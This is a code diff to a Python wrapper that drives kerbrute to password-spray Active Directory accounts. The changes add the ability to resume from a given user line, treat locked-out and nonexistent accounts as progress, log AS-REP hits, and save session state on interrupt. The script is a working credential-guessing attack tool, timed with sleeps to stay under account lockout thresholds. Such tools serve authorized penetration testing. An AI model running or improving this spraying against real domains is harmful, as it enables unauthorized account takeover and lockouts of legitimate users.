@@ -7,6 +7,7 @@ import time
 import json
 import re
 from datetime import datetime, timedelta
+import tempfile
 
 CLEAR_LINE = "\033[2K\r"
 
@@ -21,7 +22,7 @@ parser.add_argument("--sleep", type=int, default=120, help="Minutes to sleep in 
 parser.add_argument("--domain", help="Domain name.")
 parser.add_argument("--domain-ip", default="", help="Domain IP address.")
 parser.add_argument("--pwd-line", type=int, default=0, help="Line number of password to resume from (0 = start)")
-#parser.add_argument("--user-line", type=int, default=0, help="Line number of user to resume from (0 = start)")
+parser.add_argument("--user-line", type=int, default=0, help="Line number of user to resume from (0 = start)")
 parser.add_argument("--attempts", default=1, type=int, help="Number of attempts before sleeping.")
 parser.add_argument("--session-file", default=".passwordspray_session", help="File to save session state for resuming.")
 parser.add_argument("--log-file", default=".passwordspray.log", help="File to log output.")
@@ -39,7 +40,7 @@ lf = args.log_file
 seconds = s*60
 i = 0
 j = args.pwd_line
-#k = args.user_line
+k = args.user_line
 
 kerbrute_path = shutil.which("kerbrute")
 if not kerbrute_path or not os.access(kerbrute_path, os.X_OK):
@@ -47,11 +48,7 @@ if not kerbrute_path or not os.access(kerbrute_path, os.X_OK):
           "or update this script to call the program from a custom path.")
     sys.exit(1)
 
-if not os.path.exists(sf):
-    if not all([p, u, d]):
-        parser.print_help()
-        sys.exit(1)
-else:
+if os.path.exists(sf) and os.path.getsize(sf) >= 0:
     with open(sf, "r") as f:
         session = json.load(f)
         
@@ -63,6 +60,7 @@ else:
         print(f"  Domain IP: {session['domain_ip']}")
         print(f"  Attempts before sleep: {session['attempts']}")
         print(f"  Current password line: {session['pwd_line']}")
+        print(f"  Current user line: {session['user_line']}")
         print(f"  Last sprayed: {session['last_sprayed']}")
         
         while True:
@@ -83,7 +81,7 @@ else:
         ip = session['domain_ip']
         a = session['attempts']
         j = session['pwd_line']
-        #k = session['user_line']
+        k = session['user_line']
         sf = session['session_file']
         lf = session['log_file']
         seconds = s*60
@@ -99,8 +97,24 @@ else:
                 print(f"\rTime remainin before spraying: {time_format}", end="", flush=True)
                 time.sleep(1)
                 remaining_time -= 1
+else:
+    if not all([p, u, d]):
+        parser.print_help()
+        sys.exit(1)
 
-with open(u) as f:
+tu = None
+if k > 0:
+    with open(u) as f:
+        lines = f.readlines()[k:]
+    tu = tempfile.NamedTemporaryFile(delete=False, mode='w')
+    tu.writelines(lines)
+    tu.close()
+    
+    au = tu.name
+else:
+    au = u
+
+with open(au) as f:
     total_users = sum(1 for _ in f)
 
 with open (p) as passwords:
@@ -117,14 +131,14 @@ with open (p) as passwords:
         try:
             if ip != "":
                 process = subprocess.Popen(
-                    [kerbrute_path, "passwordspray", "--verbose", "-d", d, "--dc", ip, u, password],
+                    [kerbrute_path, "passwordspray", "--verbose", "-d", d, "--dc", ip, au, password],
                     stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT,
                     text=True
                 )
             else:
                 process = subprocess.Popen(
-                    [kerbrute_path, "passwordspray", "--verbose", "-d", d, u, password],
+                    [kerbrute_path, "passwordspray", "--verbose", "-d", d, au, password],
                     stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT,
                     text=True
@@ -137,7 +151,7 @@ with open (p) as passwords:
                     line = line.rstrip()
                     output_lines.append(line)
 
-                    if "Invalid password" in line:
+                    if "Invalid password" in line or "LOCKED OUT" in line or "not exist" in line:
                         curr_user += 1
                         print(f"\r[{curr_user}/{total_users}] {line}", end="", flush=True)
                     elif "VALID LOGIN" in line:
@@ -150,34 +164,44 @@ with open (p) as passwords:
                 process.wait()
             except KeyboardInterrupt:
                 process.terminate()
-                print("\nProcess interrupted by user. Saving session...")
-                # with open(sf, "w") as f:
-                #     json.dump({
-                #         "users": u,
-                #         "passwords": p,
-                #         "sleep": s,
-                #         "domain": d,
-                #         "domain_ip": ip,
-                #         "attempts": a,
-                #         "pwd_line": j,
-                #         "user_line": curr_user,
-                #         "last_sprayed": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                #         "session_file": sf,
-                #         "log_file": lf
-                #     }, f, indent=4)
+                print(f"\nProcess interrupted by user. Resume with --pwd-line {j} and --user-line {curr_user}")
                 
-                # with open(lf, "a") as log:
-                #     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                #     log.write(f"--- [{timestamp}] Password: {password} ---\n")
-                #     pattern = re.compile(r"Using KDC|VALID LOGIN|Done!")
-                #     filtered = [line for line in output_lines if pattern.search(line)]
-                #     log.write("\n".join(filtered) + "\n")
-                #     log.flush()
+                with open(sf, "w") as f:
+                    json.dump({
+                        "users": u,
+                        "passwords": p,
+                        "sleep": s,
+                        "domain": d,
+                        "domain_ip": ip,
+                        "attempts": a,
+                        "pwd_line": j,
+                        "user_line": curr_user,
+                        "last_sprayed": (datetime.now() - timedelta(minutes=s+1)).strftime("%Y-%m-%d %H:%M:%S"),
+                        "session_file": sf,
+                        "log_file": lf
+                    }, f, indent=4)
+                
+                with open(lf, "a") as log:
+                    log.write(f"--- Password: {password} ---\n")
+                    pattern = re.compile(r"Using KDC|VALID LOGIN|Done!|AS-REP")
+                    filtered = [line for line in output_lines if pattern.search(line)]
+                    log.write("\n".join(filtered) + "\n")
+                    log.flush()
+
+                sys.exit(0)
+            finally:
+                if tu and os.path.exists(tu.name):
+                    os.remove(tu.name)
+                k = 0
+                au = u
+                tu = None
+                
+                with open(au) as f:
+                    total_users = sum(1 for _ in f)
 
             with open(lf, "a") as log:
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                log.write(f"--- [{timestamp}] Password: {password} ---\n")
-                pattern = re.compile(r"Using KDC|VALID LOGIN|Done!")
+                log.write(f"--- Password: {password} ---\n")
+                pattern = re.compile(r"Using KDC|VALID LOGIN|Done!|AS-REP")
                 filtered = [line for line in output_lines if pattern.search(line)]
                 log.write("\n".join(filtered) + "\n")
                 log.flush()
@@ -200,7 +224,7 @@ with open (p) as passwords:
                 "domain_ip": ip,
                 "attempts": a,
                 "pwd_line": j,
-                #"user_line": 0,
+                "user_line": 0,
                 "last_sprayed": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "session_file": sf,
                 "log_file": lf
